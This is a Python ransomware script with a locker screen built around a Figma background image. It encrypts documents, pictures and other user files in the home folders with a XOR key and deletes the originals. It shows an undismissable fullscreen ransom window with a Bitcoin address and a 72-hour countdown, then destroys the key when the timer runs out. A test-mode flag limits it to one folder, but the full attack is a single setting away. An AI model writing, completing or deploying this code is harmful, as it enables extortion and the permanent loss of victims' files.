#!/usr/bin/env python3
"""
YOUR FIGMA DESIGN — AS BACKGROUND IMAGE
Everything works: encryption, codes, timer, OK button decrypts
"""

import os
import sys
import tkinter as tk
from tkinter import font, messagebox
import ctypes
import hashlib
import threading
import time
import random
import winsound
from PIL import Image, ImageTk

# ============================================================
# CONFIG
# ============================================================
TEST_MODE = True
TEST_FOLDER = "C:\\test_ransom"

# YOUR IMAGE — place this in the same folder
IMAGE_FILE = "Frame_1.png"  # <-- YOUR FIGMA EXPORT

BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

# 20 UNLOCK CODES
CODES = ["FS2FGNFJQI","OX77WHWEV5","FCHZT1L6IX","VX02SQI40G","6PXB85GJJJ",
         "XQHCXUH4TU","B1RQSQ9G2L","HE71R2TKVY","Q1BK76N580","01QEU0DUUE",
         "X1LSHVL0OJ","AW3YSY30V3","ZTE2DDE0X4","ZG29U3VDIC","6FNWN5JIOS",
         "F5EBA6TT08","2UUBJ4X7VN","ISP3G7NRPN","J8L0S6SHEJ","FURZCKKNZX"]
HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in CODES]
TIMER = 72 * 3600

# ============================================================
# ENCRYPTION
# ============================================================
def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def gen_key():
    return bytes([random.randint(0,255) for _ in range(32)])

def encrypt_files():
    key = gen_key()
    count = 0
    
    dirs = [TEST_FOLDER] if TEST_MODE else [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
    ]
    
    exts = ['.txt','.docx','.pdf','.jpg','.png','.zip','.py','.js',
            '.html','.css','.doc','.xls','.ppt','.sql','.db','.csv']
    
    for d in dirs:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                if any(f.lower().endswith(e) for e in exts):
                    try:
                        p = os.path.join(root, f)
                        with open(p,'rb') as fp: data = fp.read()
                        with open(p+'.locked','wb') as fp: fp.write(xor_crypt(data, key))
                        os.remove(p)
                        count += 1
                    except: pass
    
    with open(os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin','wb') as f:
        f.write(key)
    
    return count, key

def decrypt_files(key):
    count = 0
    dirs = [TEST_FOLDER] if TEST_MODE else [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
    ]
    
    for d in dirs:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                if f.endswith('.locked'):
                    try:
                        p = os.path.join(root, f)
                        with open(p,'rb') as fp: data = fp.read()
                        with open(p[:-7],'wb') as fp: fp.write(xor_crypt(data, key))
                        os.remove(p)
                        count += 1
                    except: pass
    
    return count

# ============================================================
# RANSOMWARE — YOUR IMAGE AS BACKGROUND
# ============================================================
class RansomwareUI:
    def __init__(self):
        self.count, self.key = encrypt_files()
        self.timer = TIMER
        self.unlocked = False
    
    def run(self):
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#000000')
        self.root.overrideredirect(True)
        
        # Block shortcuts
        for k in ['<Control-Alt-Delete>','<Alt-F4>','<Escape>','<Control-Shift-Escape>']:
            self.root.bind(k, lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # === LOAD YOUR IMAGE ===
        try:
            image = Image.open(IMAGE_FILE)
            
            # Get screen size
            screen_width = self.root.winfo_screenwidth()
            screen_height = self.root.winfo_screenheight()
            
            # Resize image to fullscreen
            image = image.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
            self.bg_image = ImageTk.PhotoImage(image)
            
            # Display as background
            bg_label = tk.Label(self.root, image=self.bg_image, bg='#000000')
            bg_label.place(x=0, y=0, relwidth=1, relheight=1)
            
        except Exception as e:
            print(f"[!] Could not load image: {e}")
            print("[!] Make sure 'Frame_1.png' is in the same folder")
            self.root.configure(bg='#0a0a0a')
        
        # === OVERLAY — INPUT BOX (positioned over your design) ===
        # You need to adjust these coordinates to match your Figma design
        
        # Create a transparent frame for input
        overlay = tk.Frame(self.root, bg='#000000')
        overlay.place(relx=0.5, rely=0.75, anchor='center')
        
        # Input entry
        self.entry = tk.Entry(
            overlay,
            font=('Helvetica', 18),
            width=25,
            bg='#1a1a1a',
            fg='#00ff00',
            insertbackground='#00ff00',
            bd=2,
            relief='solid'
        )
        self.entry.pack(pady=5)
        self.entry.focus_set()
        
        # OK Button
        tk.Button(
            overlay,
            text="✅ OK",
            font=('Helvetica', 16, 'bold'),
            bg='#006600',
            fg='white',
            padx=30,
            pady=8,
            command=self.unlock
        ).pack(pady=5)
        
        # === TIMER OVERLAY ===
        self.timer_lbl = tk.Label(
            self.root,
            text="⏱️ 71:59:59",
            font=('Helvetica', 36, 'bold'),
            fg='#ff0000',
            bg='#000000'
        )
        self.timer_lbl.place(relx=0.5, rely=0.9, anchor='center')
        
        # === TEST MODE ===
        if TEST_MODE:
            tk.Label(
                self.root,
                text="⚠️ TEST MODE — No real files harmed",
                font=('Helvetica', 14, 'bold'),
                fg='#00ff00',
                bg='#000000'
            ).place(relx=0.5, rely=0.05, anchor='center')
        
        # === START THREADS ===
        threading.Thread(target=self.tick, daemon=True).start()
        threading.Thread(target=self.focus, daemon=True).start()
        
        self.root.mainloop()
    
    # ============================================================
    # UNLOCK
    # ============================================================
    def unlock(self):
        code = self.entry.get().strip().upper()
        
        if not code:
            messagebox.showerror("ERROR", "Enter an unlock code!")
            return
        
        if hashlib.sha256(code.encode()).hexdigest() in HASHES:
            self.unlocked = True
            
            for _ in range(3):
                winsound.Beep(800, 100)
                time.sleep(0.05)
            winsound.Beep(1200, 300)
            
            count = decrypt_files(self.key)
            
            messagebox.showinfo(
                "✅ UNLOCKED",
                f"Decrypted {count} files!\n\nCode: {code}"
            )
            
            self.root.destroy()
            sys.exit(0)
        else:
            for _ in range(3):
                winsound.Beep(200, 200)
                time.sleep(0.05)
            
            messagebox.showerror(
                "❌ WRONG CODE",
                f"Invalid code!\n\nPayment: {BTC_ADDRESS}"
            )
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    # ============================================================
    # TIMER
    # ============================================================
    def tick(self):
        while self.timer > 0 and not self.unlocked:
            h, m, s = self.timer//3600, (self.timer%3600)//60, self.timer%60
            color = '#ff0000' if self.timer < 3600 else '#ff6600' if self.timer < 21600 else '#ff0000'
            self.timer_lbl.config(text=f"⏱️ {h:02d}:{m:02d}:{s:02d}", fg=color)
            self.timer -= 1
            time.sleep(1)
        
        if self.timer <= 0 and not self.unlocked:
            self.timer_lbl.config(text="💀 TIME EXPIRED", fg='red')
            try:
                p = os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin'
                if os.path.exists(p): os.remove(p)
            except: pass
            messagebox.showerror("💀", "Time expired. Key destroyed.")
    
    # ============================================================
    # FOCUS
    # ============================================================
    def focus(self):
        while not self.unlocked:
            try:
                self.root.focus_force()
                self.entry.focus_set()
            except: pass
            time.sleep(0.5)

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("="*50)
    print("🔴 FBI RANSOMWARE — YOUR DESIGN 🔴")
    print("="*50)
    print(f"📁 Test Mode: {TEST_MODE}")
    print(f"🖼️ Image: {IMAGE_FILE}")
    print(f"🔑 Codes: {len(CODES)}")
    print("="*50)
    
    ui = RansomwareUI()
    ui.run()

if __name__ == '__main__':
    main()
